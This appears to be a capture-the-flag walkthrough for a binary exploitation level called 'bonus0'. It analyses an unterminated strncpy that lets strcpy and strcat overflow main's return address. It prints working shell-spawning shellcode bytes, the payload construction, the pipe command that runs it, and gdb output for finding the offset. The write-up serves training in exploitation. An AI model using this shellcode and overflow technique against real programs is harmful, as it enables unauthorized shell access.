# bonus0

Nothing of note with `ll` and `checksec`.

Functions found using `(gdb) info functions`
|LIBC|user|
|-|-|
|read|main|
|strcat|p|
|strcpy|pp|
|puts|frame_dummy|
|strchr||
|strncpy||

`frame_dummy()` does nothing.

`main()` calls `pp()` and `puts()`.

`pp()` concatenates two strings stored in buffers of **20 bytes**.
They are read using the `p()` function that calls to `read()`. The *newline character* is replaced by an *end of string character*.

The first **20 bytes** of said string are copied into the dest buffer used in `pp()`.

If the input string is longer than **20 bytes**, the `\0` character is not copied and the string is not `null terminated`.

In the following example the input to **local_34** is **25 bytes** long and the input to **local_20** is **19 bytes** long.

||**local_34**|**local_20**|
|-|-|-|
|original input|[**25** chars] + '**\n**'|[**19** chars] + '**\n**'|
|'**cut**' result|[**25** chars] + '**\0**'|[**19** chars] + '**\0**'|
|**strncpy(20)** result|[**20** chars]|[**19** chars] + '**\0**'|

When **local_34** gets `strcpy()` into **param_1**, it copies both **local_34** and **local_20** since the first string contains no *null byte*. It only stops when it reaches **local_20**'s.

When **param_1** and **local_20** get concatenated into **output_string**, the result looks like this

`[local_34][local_20][ ][local_20]` instead of the intended `[local_34][ ][local_20]`.

That's all fine and dandy but how can we exploit this ?

In `main()`, **output_string** is supposed to contain **54 bytes** and the `read()`-`strncpy()` combo is supposed to get **40 bytes** (accounting for the *space* and *null byte*) at most.

We can now indirectly overflow the **output_string** up to `main()` return address.

We will rewrite this address to redirect to a *shellcode* (the one used in [level2](../level2/walkthrough.md)). This time, the *shellcode* will be stored as an **environnment variable**.

```sh
echo -e "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80" > /tmp/shellcode
export SHELLCODE=$(cat /tmp/shellcode)
```

We will use this script provided by a [stackoverflow forum post](https://stackoverflow.com/questions/31772163/get-the-environment-variable-address) to find the address of our *shellcode* in the env.

```sh
# outside the VM
./tools/inject_file.sh bonus0 level9 bonus0/getenv.c

# inside the VM
gcc /tmp/getenv.c -o /tmp/getenv
/tmp/getenv SHELLCODE
```


Now we have our address. We need to `pipe` it into the program.
Our payload needs to first fill the `pipe` with **4095** (+ '\n') in order for the first `read()` not to read the part of the input meant for the second read.

Our payload must look like this

|read #1|read #2|
|-|-|
|**4095** bytes + '\n'|**9** bytes offset + `shellcode address`|

Now we have everything
```sh
python -c "print '0' *4095 + '\n' + 'a'*9 + '//address//'" > /tmp/payload

cat /tmp/payload - | ./bonus0
```


NOTE:
We found our offset using the [overflow pattern](https://wiremask.eu/tools/buffer-overflow-pattern-generator/?).

```sh
gdb ./bonus0
[...]
(gdb) r
Starting program: /home/user/bonus0/bonus0 
 - 
01234567890123456789
 - 
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
01234567890123456789Aa0Aa1Aa2Aa3Aa4Aa5Aa��� Aa0Aa1Aa2Aa3Aa4Aa5Aa���

Program received signal SIGSEGV, Segmentation fault.
0x41336141 in ?? ()
```

`0x41336141` == `Aa3A` (converted to big endian).

In the patter it is located at Aa0Aa1Aa2**Aa3A**a4Aa5Aa...
